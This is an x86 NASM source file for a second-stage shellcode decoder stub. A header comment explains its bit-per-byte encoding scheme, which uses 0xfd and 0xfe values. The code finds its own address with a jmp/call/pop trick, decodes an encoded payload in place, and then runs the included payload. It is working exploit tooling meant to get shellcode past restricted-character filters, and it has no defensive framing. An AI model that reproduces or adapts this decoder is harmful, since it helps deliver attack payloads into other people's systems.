;
; Simple second stage decoder that attempts to reduce the size of the 3 byte
; encoded payload by minimizing the number of DEC DWORD [ESP-0x1] instructions
; are needed (4 bytes per decrement). This is accomplished by encoding the 
; raw payload where each byte of the raw payload is represented by a sequence
; of 8 bytes (1 per bit), where a bit being set is 0xfd and a bit being clear
; is 0xfe. This significantly reduces the number of DEC DWORD [ESP-0x1] that
; are required.
;

BITS 32

foo:
	
decode_loop:
	jmp short geteip
popeip:
	pop esi
	mov edi, esi
next_byte:
	mov cl, 0xf7
	not cl

next_bit:
	shl ebx,1
	lodsb
	inc al	
	inc al	
	jz zero_bit
	inc al
	inc al
	jz encoded_payload

	db 0xff, 0xc3 ; inc ebx
zero_bit:
	loop next_bit
	xchg eax,ebx
	stosb
	jmp short next_byte

	times 0x7f - ($ - popeip) db 0xfe
geteip:
	call popeip

encoded_payload:

%include "raw_payload_enc.asm"
